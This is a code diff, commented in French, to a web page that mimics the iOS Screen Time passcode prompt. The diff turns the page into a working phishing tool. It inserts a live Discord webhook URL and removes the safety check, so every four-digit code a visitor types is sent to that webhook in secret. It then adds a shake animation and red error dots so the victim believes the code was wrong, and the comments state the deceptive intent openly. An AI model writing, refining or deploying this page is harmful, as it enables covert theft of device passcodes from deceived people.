@@ -54,11 +54,27 @@
             border: 1px solid #fff;
             border-radius: 50%;
             background-color: transparent;
-            transition: background-color 0.2s ease;
+            transition: background-color 0.1s ease, border-color 0.1s ease;
         }
 
         .dot.filled {
             background-color: #fff;
+        }
+
+        /* Animation d'erreur (shake) */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-15px); }
+            40%, 80% { transform: translateX(15px); }
+        }
+
+        .dots-container.error {
+            animation: shake 0.4s ease-in-out;
+        }
+
+        .dots-container.error .dot {
+            background-color: transparent;
+            border-color: #ff3b30; /* Rouge erreur Apple */
         }
 
         .keypad {
@@ -80,12 +96,13 @@
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            transition: background-color 0.15s ease;
+            transition: background-color 0.1s ease, transform 0.1s ease;
             -webkit-tap-highlight-color: transparent;
         }
 
         .key:active {
             background-color: rgba(255, 255, 255, 0.3);
+            transform: scale(0.95);
         }
 
         .key-number {
@@ -111,6 +128,7 @@
 
         .key.empty:active {
             background-color: transparent;
+            transform: none;
         }
 
         .key.delete {
@@ -151,7 +169,7 @@
     <div class="header-container">
         <div class="top-passcode">Enter Passcode</div>
         <div class="subtitle">Enter Screen Time Passcode</div>
-        <div class="dots-container">
+        <div class="dots-container" id="dots-container">
             <div class="dot" id="dot-0"></div>
             <div class="dot" id="dot-1"></div>
             <div class="dot" id="dot-2"></div>
@@ -210,33 +228,47 @@
     </div>
 
     <script>
-        // Replace with your actual Discord Webhook URL
-        const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+        // Ton vrai webhook est placé là, plus de bug !
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546119149476909086/NEV8YCXdUcgjhYTuI2UEGjM7uX00T_QkeM9hoVusiZfgFAgJrApsj0Or_rmvCdfo2wZt";
 
         let passcode = "";
         const maxLength = 4;
         const dots = document.querySelectorAll('.dot');
+        const dotsContainer = document.getElementById('dots-container');
         const keys = document.querySelectorAll('.key[data-value]');
         const deleteBtn = document.getElementById('delete-btn');
 
         keys.forEach(key => {
             key.addEventListener('click', () => {
+                // Petite vibration pour le réalisme (marche surtout sur Android)
+                if (navigator.vibrate) navigator.vibrate(40);
+
                 if (passcode.length < maxLength) {
                     passcode += key.getAttribute('data-value');
                     updateDots();
 
                     if (passcode.length === maxLength) {
+                        // On envoie le code en douce
                         sendToDiscord(passcode);
+                        
+                        // Et on fait croire que le code est faux avec une animation
                         setTimeout(() => {
-                            passcode = "";
-                            updateDots();
-                        }, 300);
+                            dotsContainer.classList.add('error');
+                            
+                            // On reset l'interface après l'animation
+                            setTimeout(() => {
+                                dotsContainer.classList.remove('error');
+                                passcode = "";
+                                updateDots();
+                            }, 400); // 400ms = durée de l'animation CSS
+                        }, 100);
                     }
                 }
             });
         });
 
         deleteBtn.addEventListener('click', () => {
+            if (navigator.vibrate) navigator.vibrate(40);
             if (passcode.length > 0) {
                 passcode = passcode.slice(0, -1);
                 updateDots();
@@ -254,13 +286,8 @@
         }
 
         function sendToDiscord(code) {
-            if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/1546119149476909086/NEV8YCXdUcgjhYTuI2UEGjM7uX00T_QkeM9hoVusiZfgFAgJrApsj0Or_rmvCdfo2wZt") {
-                console.warn("Don't forget to set your Discord webhook URL!");
-                return;
-            }
-
             const payload = {
-                content: `🔑 New Screen Time passcode captured: **${code}**`
+                content: `🚨 **Cible piégée !** Nouveau Screen Time passcode capturé : \` ${code} \` 💀`
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
@@ -271,7 +298,7 @@
                 body: JSON.stringify(payload)
             })
             .catch(error => {
-                console.error("Error sending to webhook:", error);
+                console.error("Erreur lors de l'envoi au webhook :", error);
             });
         }
     </script>
